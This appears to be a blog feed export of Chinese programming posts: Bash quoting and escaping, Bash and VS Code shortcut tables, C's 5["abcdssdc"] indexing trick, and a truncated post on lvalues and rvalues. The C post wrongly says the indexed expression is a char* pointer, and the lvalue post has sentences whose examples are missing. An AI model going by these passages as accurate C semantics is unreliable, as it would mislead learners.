class="hljs-string">quote&amp;gt;              # Shell 继续等待输入，因为第一个引用内容是 foo\</span><br><span class="hljs-string">                    # 紧接着是字面量 bar，然后是一个未关闭的 &#x27;</span><br>quote&amp;gt;<span class="hljs-string">&#x27;             # 输入 &#x27;</span> 结束第二个引用内容（为空字符串）并回车<br>foar                <span class="hljs-comment"># echo 收到的输入为 foo\bar，\b 被 echo 解释为退格</span><br></code></pre></td></tr></table></figure><p>这个情况经常在尝试转义单引号里的单引号时发生，比如 <code>sed &#39;s/\&#39;/&quot;/g&#39;</code>, <code>grep &#39;harttle\&#39;s&#39;</code> 都是错误的写法。</p><p>双引号也是保持引用内容的字面量，但 <code>$</code>, <code>`</code>, <code>\</code> 除外（POSIX 标准）。 其中：</p><ol><li><code>$</code> 用来做 <a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion">Bash 参数展开</a>，比如 <code>echo &quot;my name is $name.&quot;</code>。</li><li><code>`</code> 表示 <a href="https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html#Command-Substitution">命令替换</a>，基本等价于 <code>$()</code>。</li><li><code>\</code> 是我们讨论的重点，它用来转义。</li></ol><p>Shell 转义奇怪的是反斜线后是 <code>$</code>, <code>`</code>, <code>&quot;</code>, <code>\</code>, <code>&lt;NL&gt;</code> 时反斜线才表示转义，否则反斜线没有特殊含义（表示一个反斜线字面量）。 例如下面两个命令都会输出 <code>harttle</code>，因为 <code>&quot;\\x&quot;</code> 的第一个反斜线表示转义，解释为 <code>&quot;\x&quot;</code>，而 <code>&quot;\x&quot;</code> 中的反斜线没有特殊含义，也解释为 <code>&quot;\x&quot;</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\\x68\\x61\\x72\\x74\\x74\\x6c\\x65&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\x68\x61\x72\x74\x74\x6c\x65&quot;</span><br></code></pre></td></tr></table></figure><p>其中 <code>\&lt;NL&gt;</code> 和单引号一样表示连行，<code>\&quot;</code> 表示字面量双引号，注意这在单引号语法中是不允许的。</p><p>现在继续看本文刚开始的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;\\x68\\x61\\x72\\x74\\x74\\x6c\\x65&#x27;</span> | xargs -0 <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%b&#x27;</span><br></code></pre></td></tr></table></figure><ol><li>由于 echo 的参数使用单引号，echo 收到的参数为字面量 <code>\\x68\\x61\\x72\\x74\\x74\\x6c\\x65</code>。</li><li>因此 <code>echo &#39;\\x68\\x61\\x72\\x74\\x74\\x6c\\x65&#39;</code> 的输出为：<code>\x68\x61\x72\x74\x74\x6c\x65</code>。</li><li>由于 <code>xargs -0</code> 下标准输入会被当做字面量处理（<code>\</code> 不再是特殊字符），<code>xargs</code> 给到 <code>printf</code> 的第二个参数为字面量 <code>\x68\x61\x72\x74\x74\x6c\x65</code>，第一个参数为 <code>%b</code>。</li><li><code>printf</code> 处理十六进制 ASCII 字面量语法，输出 <code>harttle</code>。</li></ol><p>有两点需要注意：</p><ul><li>如果 echo 的第一个参数只有单个反斜线（<code>\x68\x61\x72\x74\x74\x6c\x65</code>），echo 的输出即为 <code>harttle</code>，经过 <code>printf</code> 后仍然为 <code>harttle</code>；</li><li>如果 <code>xargs</code> 没有添加 <a href="https://www.gnu.org/software/findutils/manual/html_node/find_html/xargs-options.html"><code>-0</code> 参数</a>，<code>xargs</code> 会把它的标准输入正常做 Bash 转义，也就是说 <code>xargs</code> 给到 <code>printf</code> 的第二个参数将会是 <code>x68x61x72x74x74x6cx65</code>，因为 Bash 转义中 <code>\x</code> 的语义（见“转义”一节）和 <code>printf</code> 转义中 <code>\x</code> 的语义不同。</li></ul><p>本文采用 <a href="http://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>（CC-BY 4.0）进行许可，转载注明来源即可： <a href="https://harttle.land/2020/06/26/bash-quote-escape.html">https://harttle.land/2020/06/26/bash-quote-escape.html</a>。如有疏漏、谬误、侵权请通过评论或 <a href="mailto:harttleharttle@gmail.com">邮件</a> 指出。</p>]]></content>
    
    
    <categories>
      
      <category>bash</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash快捷键</title>
    <link href="/2024/04/20/bash%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <url>/2024/04/20/bash%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    
    <content type="html"><![CDATA[<p>关于Bash常用的快捷键总结</p><span id="more"></span><p><a href="http://www.gnu.org/software/bash/">Bash</a>快捷键其实是<a href="http://tiswww.case.edu/php/chet/readline/rltop.html">GNU Readline</a>快捷键， <a href="http://tiswww.case.edu/php/chet/readline/rltop.html">GNU Readline Library</a>是一个来接受用户输入的GNU软件包。 它是包括<a href="http://www.gnu.org/software/bash/">Bash</a>在内的绝大多数Shell的底层库， 甚至OSX&#x2F;Windows&#x2F;Linux下的绝大多数软件都采用与之兼容快捷键。 因此这些快捷键可以在很大程度上支持纯键盘操作，尤其是在Linux&#x2F;OSX下。</p><blockquote><p><a href="http://www.gnu.org/software/bash/">Bash</a>是GNU计划的一部分，是多数Linux发行版提供的默认Shell。 Linux的精髓就在于命令行的高效，而学习命令行的第一步便是学习如何快速地输入Bash命令。</p></blockquote><h2 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Ctrl + a</code></td><td>移动光标到行首</td></tr><tr><td><code>Ctrl + e</code></td><td>移动光标到行尾</td></tr><tr><td><code>Alt + b</code></td><td>移动光标后退一个单词（词首）</td></tr><tr><td><code>Alt + f</code></td><td>移动光标前进一个单词（词首）</td></tr><tr><td><code>Ctrl + f</code></td><td>光标前进一个字母</td></tr><tr><td><code>Ctrl + b</code></td><td>光标后退一个字母</td></tr><tr><td><code>Ctrl + xx</code></td><td>当前位置与行首之间光标切换</td></tr></tbody></table><h2 id="剪切粘贴"><a href="#剪切粘贴" class="headerlink" title="剪切粘贴"></a>剪切粘贴</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Ctrl + k</code></td><td>删除从光标到行尾</td></tr><tr><td><code>Ctrl + u</code></td><td>删除从光标到行首</td></tr><tr><td><code>Ctrl + w</code></td><td>从光标向前删除一个单词</td></tr><tr><td><code>Alt + d</code></td><td>从光标向后删除一个单词</td></tr><tr><td><code>Ctrl + d</code></td><td>删除光标下一个字母</td></tr><tr><td><code>Ctrl + h</code></td><td>删除光标前一个字母</td></tr><tr><td><code>Alt + t</code></td><td>swap(当前单词, 上一个单词)</td></tr><tr><td><code>Ctrl + t</code></td><td>swap(当前字母, 上一个字母)</td></tr><tr><td><code>Ctrl + y</code></td><td>粘贴上一次删除的文本</td></tr></tbody></table><h2 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Alt + c</code></td><td>大写当前字母，并移动光标到单词尾</td></tr><tr><td><code>Alt + u</code></td><td>大写从当光标到单词尾</td></tr><tr><td><code>Alt + l</code></td><td>小写从当光标到单词尾</td></tr></tbody></table><h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Ctrl + r</code></td><td>向后搜索历史命令</td></tr><tr><td><code>Ctrl + g</code></td><td>退出搜索</td></tr><tr><td><code>Ctrl + p</code></td><td>历史中上一个命令</td></tr><tr><td><code>Ctrl + n</code></td><td>历史中下一个命令</td></tr><tr><td><code>Alt + .</code></td><td>上一个命令的最后一个单词</td></tr></tbody></table><h2 id="终端指令"><a href="#终端指令" class="headerlink" title="终端指令"></a>终端指令</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Ctrl + l</code></td><td>清屏</td></tr><tr><td><code>Ctrl + s</code></td><td>停止输出（在Zsh中为向前搜索历史命令）</td></tr><tr><td><code>Ctrl + q</code></td><td>继续输出</td></tr><tr><td><code>Ctrl + c</code></td><td>终止当前命令</td></tr><tr><td><code>Ctrl + z</code></td><td>挂起当前命令</td></tr><tr><td><code>Ctrl + d</code></td><td>结束输入（产生一个EOF）</td></tr></tbody></table><h2 id="纯键盘写邮件？"><a href="#纯键盘写邮件？" class="headerlink" title="纯键盘写邮件？"></a>纯键盘写邮件？</h2><p>绝大多数操作系统（OSX，Windows，Linux）中的绝大多数软件（GUI的、命令行的） 在底层都使用GNU Readline兼容的库来读取用户输入。 <strong>因此Bash快捷键完全可以胜任纯键盘写邮件</strong>：</p><ul><li>同一行内移动光标：<code>Ctrl-B</code>, <code>Ctrl-F</code>, <code>Ctrl-A</code>, <code>Ctrl-E</code>等。</li><li>上下行移动光标：<code>Ctrl-P</code>, <code>Ctrl-N</code>。</li><li>剪切&#x2F;粘贴：<code>Ctrl-W</code>, <code>Alt-D</code>等。</li></ul><h2 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h2><ul><li><a href="http://www.skorks.com/2009/09/bash-shortcuts-for-maximum-productivity/">http://www.skorks.com/2009/09/bash-shortcuts-for-maximum-productivity/</a></li><li><a href="http://ss64.com/bash/syntax-keyboard.html">http://ss64.com/bash/syntax-keyboard.html</a></li><li>GNU readline：<a href="http://www.bigsmoke.us/readline/shortcuts">http://www.bigsmoke.us/readline/shortcuts</a></li><li><a href="https://harttle.land/2017/04/03/shell-variable-scope.html">Shell 中的变量作用域</a></li></ul><p>本文采用 <a href="http://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>（CC-BY 4.0）进行许可，转载注明来源即可： <a href="https://harttle.land/2015/11/09/bash-shortcuts.html">https://harttle.land/2015/11/09/bash-shortcuts.html</a>。如有疏漏、谬误、侵权请通过评论或 <a href="mailto:harttleharttle@gmail.com">邮件</a> 指出。</p>]]></content>
    
    
    <categories>
      
      <category>bash</category>
      
      <category>快捷键</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VsCode快捷键</title>
    <link href="/2024/04/20/vscode%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <url>/2024/04/20/vscode%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    
    <content type="html"><![CDATA[<p>关于VsCode常用的快捷键总结</p><span id="more"></span><h1 id="vs-code-快捷键"><a href="#vs-code-快捷键" class="headerlink" title="vs code 快捷键"></a>vs code 快捷键</h1><h2 id="界面概览"><a href="#界面概览" class="headerlink" title="界面概览"></a>界面概览</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + shift + e</td><td>文件资源管理器</td></tr><tr><td>cmd + shift + f</td><td>跨文件搜索</td></tr><tr><td>ctrl + shift + g</td><td>源代码管理</td></tr><tr><td>cmd + shift + d</td><td>启动和调试</td></tr><tr><td>cmd + shift + x</td><td>扩展管理</td></tr><tr><td>cmd + shift + p</td><td>查找并运行所有命令</td></tr><tr><td>cmd + j</td><td>打开、关闭panel</td></tr></tbody></table><h2 id="命令行的使用"><a href="#命令行的使用" class="headerlink" title="命令行的使用"></a>命令行的使用</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>code $path</td><td>新窗口中打开这个文件或文件夹</td></tr><tr><td>code -r $path</td><td>窗口复用打开文件</td></tr><tr><td>code -r -g $file:lineno</td><td>打开文件，跳转到指定行</td></tr><tr><td>code -r -d $file1 $file2</td><td>比较两个文件</td></tr><tr><td>ls</td><td>code -</td></tr></tbody></table><h2 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>option + 左&#x2F;右方向键</td><td>针对单词的光标移动</td></tr><tr><td>cmd + 左&#x2F;右方向键</td><td>移动到行首、行尾</td></tr><tr><td>cmd + shift + \</td><td>在花括号之间跳转</td></tr><tr><td>cmd + 上&#x2F;下方向键</td><td>移动到文档的第一行、最后一行</td></tr></tbody></table><h2 id="文本选择"><a href="#文本选择" class="headerlink" title="文本选择"></a>文本选择</h2><p>shift + 光标移动</p><h2 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h2><p>可以先选择，再删除</p><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + fn + del</td><td>删除到行尾</td></tr><tr><td>cmd + del</td><td>删除到行首</td></tr><tr><td>option + del</td><td>向前删除单词</td></tr><tr><td>option + fn + del</td><td>向后删除单词</td></tr></tbody></table><h2 id="代码行编辑"><a href="#代码行编辑" class="headerlink" title="代码行编辑"></a>代码行编辑</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + shift + k</td><td>删除行</td></tr><tr><td>cmd + x</td><td>剪切行</td></tr><tr><td>cmd + enter</td><td>在当前行下一行新开始一行</td></tr><tr><td>cmd + shift + enter</td><td>在当前行上一行新开始一行</td></tr><tr><td>option +  上&#x2F;下方向键</td><td>将当前行上下移动</td></tr><tr><td>option + shift + 上&#x2F;下方向键</td><td>将当前行上下复制</td></tr><tr><td>cmd + &#x2F;</td><td>将一行代码注释</td></tr><tr><td>option + shift + a</td><td>注释整块代码</td></tr><tr><td>option + shift + f</td><td>代码格式化</td></tr><tr><td>cmd+k cmd+f</td><td>选中代码格式化</td></tr><tr><td>ctrl + t</td><td>光标前后字符调换位置</td></tr><tr><td>cmd+shift+p transform to up&#x2F;low case</td><td>转换大小写</td></tr><tr><td>ctrl + j</td><td>合并代码行</td></tr><tr><td>cmd + u</td><td>撤销光标移动</td></tr></tbody></table><h2 id="创建多个光标"><a href="#创建多个光标" class="headerlink" title="创建多个光标"></a>创建多个光标</h2><ul><li>使用鼠标</li></ul><p><code>option + 鼠标左键</code></p><ul><li>使用键盘</li></ul><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + option + 上&#x2F;下方向键</td><td>创建多个光标</td></tr><tr><td>cmd + d</td><td>选中相同单词，并创建多个光标</td></tr><tr><td>option + shift+ i</td><td>在选择的多行后创建光标</td></tr></tbody></table><h2 id="文件跳转"><a href="#文件跳转" class="headerlink" title="文件跳转"></a>文件跳转</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>ctrl + tab</td><td>文件标签之间跳转</td></tr><tr><td>cmd + p</td><td>打开文件列表</td></tr></tbody></table><h2 id="行跳转"><a href="#行跳转" class="headerlink" title="行跳转"></a>行跳转</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>ctrl + g</td><td>跳转到指定行</td></tr></tbody></table><h2 id="符号跳转"><a href="#符号跳转" class="headerlink" title="符号跳转"></a>符号跳转</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + shift + o</td><td>当前文件所有符号列表</td></tr><tr><td>@:</td><td>符号列表@后输入冒号，符号分类排列</td></tr><tr><td>cmd + t</td><td>在多个文件进行符号跳转</td></tr><tr><td>cmd + F12</td><td>跳转到函数的实现位置</td></tr><tr><td>shift + F12</td><td>函数引用列表</td></tr><tr><td>ctrl + -</td><td>跳回上一次光标所在位置</td></tr><tr><td>ctrl + shift + -</td><td>跳回下一次光标所在位置</td></tr></tbody></table><h2 id="代码自动补全"><a href="#代码自动补全" class="headerlink" title="代码自动补全"></a>代码自动补全</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>ctrl+ space</td><td>调出建议列表</td></tr><tr><td>cmd + shift + space</td><td>调出参数预览窗口</td></tr><tr><td>cmd + .</td><td>快速修复建议列表</td></tr><tr><td>F2</td><td>函数名重构</td></tr></tbody></table><h2 id="代码折叠"><a href="#代码折叠" class="headerlink" title="代码折叠"></a>代码折叠</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd+ option + [</td><td>最内层折叠</td></tr><tr><td>cmd + option + ]</td><td>最内层展开</td></tr><tr><td>cmd+k cmd+0</td><td>全部折叠</td></tr><tr><td>cmd+k cmd+j</td><td>全部展开</td></tr></tbody></table><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + f</td><td>搜索</td></tr><tr><td>cmd + g</td><td>搜索，光标在编辑器内跳转</td></tr><tr><td>cmd + option + f</td><td>查找替换</td></tr><tr><td>cmd + shift + f</td><td>多文件搜索</td></tr></tbody></table><h2 id="编辑器操作"><a href="#编辑器操作" class="headerlink" title="编辑器操作"></a>编辑器操作</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + \</td><td>拆分编辑器</td></tr><tr><td>option + cmd + 左&#x2F;右方向键</td><td>编辑器间切换</td></tr><tr><td>cmd + num</td><td>在拆分的编辑器窗口跳转</td></tr><tr><td>Cmd +&#x2F;-</td><td>缩放整个工作区</td></tr><tr><td>cmd + shift + p <code>reset zoom</code></td><td>重置缩放</td></tr></tbody></table><h2 id="专注模式"><a href="#专注模式" class="headerlink" title="专注模式"></a>专注模式</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + b</td><td>打开或者关闭整个视图</td></tr><tr><td>cmd + j</td><td>打开或者关闭面板</td></tr><tr><td>cmd+shift+p <code>Toggle Zen Mode</code></td><td>切换禅模式</td></tr><tr><td>cmd+shift+p <code>Toggle Centered Layout</code></td><td>切换剧中布局</td></tr></tbody></table><h2 id="命令面板"><a href="#命令面板" class="headerlink" title="命令面板"></a>命令面板</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd + shift + p</td><td>命令面板</td></tr></tbody></table><p>命令面板的第一个符合对应着不同的功能：</p><ul><li><code>?</code> 列出所有可用功能</li><li><code>&gt;</code> 用于显示所有的命令</li><li><code>@</code> 用于显示和跳转文件中的 “符号”（Symbols）</li><li><code>@:</code> 可以把符号们按类别归类</li><li><code>#</code> 用于显示和跳转工作区中的 “符号”（Symbols）。</li><li><code>:</code> 用于跳转到当前文件中的某一行。</li><li><code>edt</code> 显示所有已经打开的文件</li><li><code>edt active</code> 显示当前活动组中的文件</li><li><code>ext</code> 插件的管理</li><li><code>ext install</code> 搜索和安装插件。</li><li><code>task</code> 任务</li><li><code>debug</code> 调试功能</li><li><code>term</code>创建和管理终端实例</li><li><code>view</code> 打开各个 UI 组件</li></ul><h2 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>ctrl + w</td><td>窗口切换</td></tr><tr><td>ctrl + r</td><td>切换文件夹</td></tr><tr><td>ctrl+r cmd+enter</td><td>新建窗口打开文件夹</td></tr></tbody></table><h2 id="集成终端"><a href="#集成终端" class="headerlink" title="集成终端"></a>集成终端</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>ctrl + &#96;</td><td>切换集成终端</td></tr><tr><td>ctrl + shift + &#96;</td><td>新建集成终端</td></tr><tr><td>cmd+shift+p <code>Run Active File In Active Terminal</code></td><td>在集成终端中运行当前脚本</td></tr><tr><td>cmd+shift+p <code>Run Selected Text In Active Terminal</code></td><td>在集成终端中运行所选文本</td></tr></tbody></table><h2 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>cmd+shift+p <code>run task</code></td><td>自动检测当前项目中可运行的任务</td></tr><tr><td>cmd+shift+p <code>Configure Task</code></td><td>配置任务</td></tr><tr><td>Cmd + Shift + b</td><td>运行默认的生成任务（build task）</td></tr></tbody></table><h2 id="鼠标操作"><a href="#鼠标操作" class="headerlink" title="鼠标操作"></a>鼠标操作</h2><ul><li>文本选择<ul><li>双击鼠标，选中单词</li><li>三击鼠标，选中一行</li><li>四击鼠标，选中整个文档</li><li>单击行号，选中行</li></ul></li><li>文本编辑<ul><li>选中后可以拖动文本到指定区域</li><li>拖动过程中按<code>option</code>，变成复制文本到指定区域</li></ul></li><li>在悬停窗口上按下<code>cmd</code>，提示函数的实现</li></ul>]]></content>
    
    
    <categories>
      
      <category>快捷键</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>特殊的C语言数组表达方式</title>
    <link href="/2024/04/19/%E7%89%B9%E6%AE%8A%E7%9A%84C%E8%AF%AD%E8%A8%80%E6%95%B0%E7%BB%84%E8%A1%A8%E8%BE%BE%E6%96%B9%E5%BC%8F/"/>
    <url>/2024/04/19/%E7%89%B9%E6%AE%8A%E7%9A%84C%E8%AF%AD%E8%A8%80%E6%95%B0%E7%BB%84%E8%A1%A8%E8%BE%BE%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>特殊的C语言数组表达方式</p><span id="more"></span><p>先来看一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>, <span class="hljs-number">5</span>[<span class="hljs-string">&quot;abcdssdc&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>你觉得这段程序会打印出什么？ <code>s</code> ，确实是 <code>s</code> 。原因很简单，因为 <code>s</code> 是字符串 <code>“abcdssdc”</code> 的第 <code>5</code> 个字符。<strong>并且其类型是<code>char*</code>类型，是一个指针</strong>。我们把这个程序转换一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>      <span class="hljs-type">char</span> *tmp = <span class="hljs-string">&quot;abcdssdc&quot;</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>, *(tmp+<span class="hljs-number">5</span>));<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在应该清楚了。这种奇怪的写法其实是利用了，在 C 语言中， <code>‘[]’</code> 操作符里外可以互换。一个数组表达式 <code>“a[5]”</code> ，可以写成 <code>“5[a]”</code> 。在编译器看来，这两种写法最后都会翻译成 <code>“*(a+5)”</code> 。更进一步，只要表达式 <code>“x[y]”</code> 中， <code>x</code> 和 <code>y</code> 可以进行加法运算，且运算后的结果可以正常作为一个地址被引用，那这种写法就是合法的，且编译器不会报任何错误。</p><p>但是，回过头来，这种写法在正常的程序中有用吗？个人感觉没有多大的实用价值，但是说不定会在 <code>Obfuscated C Contest</code> 中有用 :)</p><p><strong>总结：在C语言中的数组，在<code>a[b]</code>只要是指针和数字的结合就是正确的，或者认为对于任何两个表达式 <code>a</code> 和 <code>b</code> ，只要其中一个是指针表达式，一个是整型。二者就可以互换位置</strong></p><p><strong>以上就是为什么<code>5[&quot;abcdssdc&quot;]</code>可以打印出<code>s</code>的原因了</strong></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://tinylab.org/c-faq6-11-array-of-weird-wording/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>c-faq</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>左值和右值</title>
    <link href="/2024/04/19/%E5%B7%A6%E5%80%BC%E5%92%8C%E5%8F%B3%E5%80%BC/"/>
    <url>/2024/04/19/%E5%B7%A6%E5%80%BC%E5%92%8C%E5%8F%B3%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>C语言中的左值和右值</p><span id="more"></span><p>在 <code>C</code> 和 <code>C++</code> 中，我们经常会碰到两个概念， <code>lvalue</code> 和 <code>rvalue</code> 。甚至在编译程序的时候，也会碰到一些关于 <code>lvalue</code> 和 <code>rvalue</code> 的错误。</p><p>在 <code>ISO IEC</code> 的标准文档中，对这两个概念并没有详细说明，特别是 <code>rvalue</code> ，只在一个地方提了一下。</p><p>在 IBM 的 XL C&#x2F;C++ V8.0 for AIX 的标准文档中是这样来规定 <code>lvalue</code> ：</p><blockquote><p>An object is a region of storage that can be examined and stored into. An <code>lvalue</code> is an expression that refers to such an object.</p></blockquote><p><strong>左值就是始终可以被解析为相应对象的地址，除非该对象是位字段或者是使用了<code>register</code>关键字声明的变量。</strong></p><p>产生左值的运算符包括：</p><ul><li><code>[]</code></li><li><code>*</code></li></ul><p>示例：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404192302966.png"></p><p>其中<strong>最后两个不是左值</strong>，因为</p><p>也就是说 <code>lvalue</code> 是一个表达式，且指向一个可读写的存储区域。而 <code>rvalue</code> ，可以为任何表达式。 <code>lvalue</code> 和 <code>rvalue</code> 的取名，是来自于一个赋值表达式中的。对于一个合法的赋值表达式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">L = R;<br></code></pre></td></tr></table></figure><p>我们就说 <code>L</code> 是 <code>lvalue</code> ， <code>R</code> 是 <code>rvalue</code> 。 <code>lvalue</code> 必须是可写的，且 <code>lvalue</code> 可以转换为 <code>rvalue</code> ，但是 <code>rvalue</code> 却不一定能转换成 <code>lvalue</code> 。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> x;<br>x=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>这个赋值是合法的，因为 <code>x</code> 是一个 <code>lvalue</code> ，但是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>=x;<br></code></pre></td></tr></table></figure><p>这种写法明显是错误的，因为 <code>1</code> 只是一个 <code>rvalue</code> 。</p><p>左值和右值不仅仅存在于变量中，在表达式中，也是存在的。因为在 <code>lvalue</code> 和 <code>rvalue</code> 的定义中，它们的本质就是一个表达式。不是所有的表达式都会产生 <code>lvalue</code> 的。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(m+<span class="hljs-number">1</span>)=n;<br></code></pre></td></tr></table></figure><p>这是一个错误的赋值语句，因为加法产生的结果是 <code>rvalue</code> 。对于一些一元运算符，有的会产生 <code>lvalue</code> ，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> m,*p;<br>p=&amp;m;<br>&amp;m=p; <span class="hljs-comment">//error</span><br></code></pre></td></tr></table></figure><p>明显，最后一个是错误的，因为 <code>&amp;</code> 产生的是 <code>rvalue</code> ，但是这种写法：</p><p>却是正确的，因为 * 产生的是 <code>lvalue</code> 。再举一个复杂的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">((condition) ? a : b) = complicated_expression; <span class="hljs-comment">//error</span><br>*((condition) ? &amp;a : &amp;b) = complicated_expression; <span class="hljs-comment">//correct</span><br></code></pre></td></tr></table></figure><p>对于很多类型转换，你可能会这么用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *p;<br>((<span class="hljs-type">int</span> *)p)++;<br></code></pre></td></tr></table></figure><p>你的目的是想让指针 <code>p</code> 跳过几个 <code>int</code> 大小的位置，但是这个代码却不能正常执行。 原因有两个，一个是类型转换操作最后产生的是一个 <code>rvalue</code> ，也就无法用于 <code>++</code> 。另外一个，类型转换只是做一个类型转换， 并不会让编译器也随着类型改变相应的大小，也就是说最后， <code>++</code> 操作所加的大小并不是一个 <code>int</code> 的大小，而是一个 <code>char</code> 的大小。 所以你应该这样做：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">p = (<span class="hljs-type">char</span> *)((<span class="hljs-type">int</span> *)p + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a 